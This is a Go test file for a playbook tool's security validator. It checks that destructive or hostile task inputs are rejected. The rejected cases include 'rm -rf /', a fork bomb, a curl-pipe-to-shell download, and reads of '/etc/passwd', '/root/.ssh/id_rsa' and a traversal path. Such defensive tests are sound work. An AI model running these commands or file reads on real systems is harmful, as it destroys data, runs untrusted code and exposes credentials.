package security

import (
	"testing"

	"github.com/stretchr/testify/assert"

	"github.com/onigirazu-cfg/onigirazu/pkg/types"
)

func TestNewSecurityValidator(t *testing.T) {
	config := DefaultSecurityConfig()
	validator := NewSecurityValidator(config)

	assert.NotNil(t, validator)
	assert.NotEmpty(t, config.BlockedCommands)
	assert.NotEmpty(t, config.BlockedDirectories)
	assert.NotEmpty(t, config.AllowedFileTypes)
	assert.Greater(t, config.MaxFileSize, int64(0))
}

func TestSecurityValidator_ValidateCommandTask(t *testing.T) {
	config := DefaultSecurityConfig()
	validator := NewSecurityValidator(config)

	tests := []struct {
		name    string
		task    *types.Task
		wantErr bool
	}{
		{
			name: "safe command",
			task: &types.Task{
				Name:   "safe command",
				Module: "command",
				Args: map[string]interface{}{
					"command": "ls -la",
				},
			},
			wantErr: false,
		},
		{
			name: "dangerous rm command",
			task: &types.Task{
				Name:   "dangerous command",
				Module: "command",
				Args: map[string]interface{}{
					"command": "rm -rf /",
				},
			},
			wantErr: true,
		},
		{
			name: "fork bomb",
			task: &types.Task{
				Name:   "fork bomb",
				Module: "command",
				Args: map[string]interface{}{
					"command": ":(){ :|:& };:",
				},
			},
			wantErr: true,
		},
		{
			name: "command substitution",
			task: &types.Task{
				Name:   "command substitution",
				Module: "command",
				Args: map[string]interface{}{
					"command": "echo $(whoami)",
				},
			},
			wantErr: true,
		},
		{
			name: "pipe to shell",
			task: &types.Task{
				Name:   "pipe to shell",
				Module: "command",
				Args: map[string]interface{}{
					"command": "curl http://example.com/script.sh | sh",
				},
			},
			wantErr: true,
		},
		{
			name: "simple command chaining",
			task: &types.Task{
				Name:   "simple chaining",
				Module: "command",
				Args: map[string]interface{}{
					"command": "mkdir test && cd test",
				},
			},
			wantErr: false,
		},
		{
			name: "complex command chaining",
			task: &types.Task{
				Name:   "complex chaining",
				Module: "command",
				Args: map[string]interface{}{
					"command": "cmd1 && cmd2 || cmd3; cmd4 && cmd5",
				},
			},
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validator.ValidateTask(*tt.task)
			if tt.wantErr {
				assert.False(t, result.Valid)
			} else {
				assert.True(t, result.Valid)
			}
		})
	}
}

func TestSecurityValidator_ValidateFileTask(t *testing.T) {
	config := DefaultSecurityConfig()
	validator := NewSecurityValidator(config)

	tests := []struct {
		name    string
		task    *types.Task
		wantErr bool
	}{
		{
			name: "safe file path",
			task: &types.Task{
				Name:   "safe file",
				Module: "file",
				Args: map[string]interface{}{
					"path": "/tmp/test.txt",
				},
			},
			wantErr: false,
		},
		{
			name: "blocked path - passwd",
			task: &types.Task{
				Name:   "blocked file",
				Module: "file",
				Args: map[string]interface{}{
					"path": "/etc/passwd",
				},
			},
			wantErr: true,
		},
		{
			name: "directory traversal",
			task: &types.Task{
				Name:   "traversal",
				Module: "file",
				Args: map[string]interface{}{
					"path": "/tmp/../etc/passwd",
				},
			},
			wantErr: true,
		},
		{
			name: "ssh key access",
			task: &types.Task{
				Name:   "ssh key",
				Module: "file",
				Args: map[string]interface{}{
					"path": "/root/.ssh/id_rsa",
				},
			},
			wantErr: true,
		},
		{
			name: "large content",
			task: &types.Task{
				Name:   "large file",
				Module: "file",
				Args: map[string]interface{}{
					"path":    "/tmp/large.txt",
					"content": string(make([]byte, 200*1024*1024)), // 200MB
				},
			},
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validator.ValidateTask(*tt.task)
			if tt.wantErr {
				assert.False(t, result.Valid)
			} else {
				assert.True(t, result.Valid)
			}
		})
	}
}

func TestSecurityValidator_ValidateUserTask(t *testing.T) {
	config := DefaultSecurityConfig()
	validator := NewSecurityValidator(config)

	tests := []struct {
		name    string
		task    *types.Task
		wantErr bool
	}{
		{
			name: "safe user",
			task: &types.Task{
				Name:   "create user",
				Module: "user",
				Args: map[string]interface{}{
					"name": "testuser",
				},
			},
			wantErr: false,
		},
		{
			name: "system user",
			task: &types.Task{
				Name:   "modify root",
				Module: "user",
				Args: map[string]interface{}{
					"name": "root",
				},
			},
			wantErr: true,
		},
		{
			name: "user with UID 0",
			task: &types.Task{
				Name:   "root equivalent",
				Module: "user",
				Args: map[string]interface{}{
					"name":  "testuser",
					"uid":   0,
					"shell": "/bin/bash",
				},
			},
			wantErr: true,
		},
		{
			name: "safe user with shell",
			task: &types.Task{
				Name:   "user with shell",
				Module: "user",
				Args: map[string]interface{}{
					"name":  "testuser",
					"uid":   1000,
					"shell": "/bin/bash",
				},
			},
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validator.ValidateTask(*tt.task)
			if tt.wantErr {
				assert.False(t, result.Valid)
			} else {
				assert.True(t, result.Valid)
			}
		})
	}
}

func TestSecurityValidator_ValidateGroupTask(t *testing.T) {
	config := DefaultSecurityConfig()
	validator := NewSecurityValidator(config)

	tests := []struct {
		name    string
		task    *types.Task
		wantErr bool
	}{
		{
			name: "safe group",
			task: &types.Task{
				Name:   "create group",
				Module: "group",
				Args: map[string]interface{}{
					"name": "testgroup",
				},
			},
			wantErr: false,
		},
		{
			name: "system group",
			task: &types.Task{
				Name:   "modify root group",
				Module: "group",
				Args: map[string]interface{}{
					"name": "root",
				},
			},
			wantErr: true,
		},
		{
			name: "group with GID 0",
			task: &types.Task{
				Name:   "root equivalent group",
				Module: "group",
				Args: map[string]interface{}{
					"name": "testgroup",
					"gid":  0,
				},
			},
			wantErr: true,
		},
		{
			name: "safe group with GID",
			task: &types.Task{
				Name:   "group with GID",
				Module: "group",
				Args: map[string]interface{}{
					"name": "testgroup",
					"gid":  1000,
				},
			},
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validator.ValidateTask(*tt.task)
			if tt.wantErr {
				assert.False(t, result.Valid)
			} else {
				assert.True(t, result.Valid)
			}
		})
	}
}

func TestSecurityValidator_ValidateVariables(t *testing.T) {
	config := DefaultSecurityConfig()
	validator := NewSecurityValidator(config)

	tests := []struct {
		name      string
		variables map[string]interface{}
		wantErr   bool
	}{
		{
			name: "safe variables",
			variables: map[string]interface{}{
				"username": "testuser",
				"port":     8080,
				"enabled":  true,
			},
			wantErr: false,
		},
		{
			name: "suspicious variable name",
			variables: map[string]interface{}{
				"../etc/passwd": "value",
			},
			wantErr: true,
		},
		{
			name: "dangerous variable content",
			variables: map[string]interface{}{
				"command": "rm -rf /",
			},
			wantErr: true,
		},
		{
			name: "variable with path separator",
			variables: map[string]interface{}{
				"path/to/file": "value",
			},
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validator.ValidateVariables(tt.variables)
			if tt.wantErr {
				assert.False(t, result.Valid)
			} else {
				assert.True(t, result.Valid)
			}
		})
	}
}

func TestSecurityValidator_ValidatePlaybook(t *testing.T) {
	config := DefaultSecurityConfig()
	validator := NewSecurityValidator(config)

	playbook := &types.Playbook{
		Name: "Test Playbook",
		Plays: []types.Play{
			{
				Name:  "Safe Play",
				Hosts: "localhost",
				Tasks: []types.Task{
					{
						Name:   "safe task",
						Module: "command",
						Args: map[string]interface{}{
							"command": "echo hello",
						},
					},
				},
			},
			{
				Name:  "Dangerous Play",
				Hosts: "localhost",
				Tasks: []types.Task{
					{
						Name:   "dangerous task",
						Module: "command",
						Args: map[string]interface{}{
							"command": "rm -rf /",
						},
					},
				},
			},
		},
	}

	result := validator.ValidatePlaybook(*playbook)
	assert.False(t, result.Valid)
	assert.NotEmpty(t, result.Violations)
}

func TestSecurityValidator_AddDangerousPattern(t *testing.T) {
	config := DefaultSecurityConfig()
	validator := NewSecurityValidator(config)

	// Add valid pattern
	err := validator.AddDangerousPattern(`test.*pattern`)
	assert.NoError(t, err)

	// Add invalid pattern
	err = validator.AddDangerousPattern(`[invalid`)
	assert.Error(t, err)
}

func TestSecurityValidator_SetMaxFileSize(t *testing.T) {
	config := DefaultSecurityConfig()
	validator := NewSecurityValidator(config)

	originalSize := validator.config.MaxFileSize
	newSize := int64(50 * 1024 * 1024) // 50MB

	validator.SetMaxFileSize(newSize)
	assert.Equal(t, newSize, validator.config.MaxFileSize)
	assert.NotEqual(t, originalSize, validator.config.MaxFileSize)
}

func TestSecurityValidator_AddBlockedPath(t *testing.T) {
	config := DefaultSecurityConfig()
	validator := NewSecurityValidator(config)

	originalCount := len(validator.config.BlockedDirectories)
	validator.AddBlockedPath("/custom/blocked/path")

	assert.Equal(t, originalCount+1, len(validator.config.BlockedDirectories))
	assert.Contains(t, validator.config.BlockedDirectories, "/custom/blocked/path")
}
